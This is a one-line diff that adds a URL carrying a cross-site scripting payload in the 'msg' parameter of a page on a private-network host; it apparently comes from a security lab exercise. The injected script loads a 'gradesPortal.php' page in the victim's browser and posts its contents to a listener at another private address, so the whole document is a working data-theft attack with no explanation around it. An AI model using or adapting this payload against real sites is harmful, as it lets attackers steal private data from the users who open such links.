@@ -1,0 +1,1 @@
+http://192.168.1.203/task1ref.php?msg=<script>fetch("gradesPortal.php").then(x=>x.text()).then(y=>fetch("http://192.168.1.201:5555",{method:"POST",body:y}))</script>
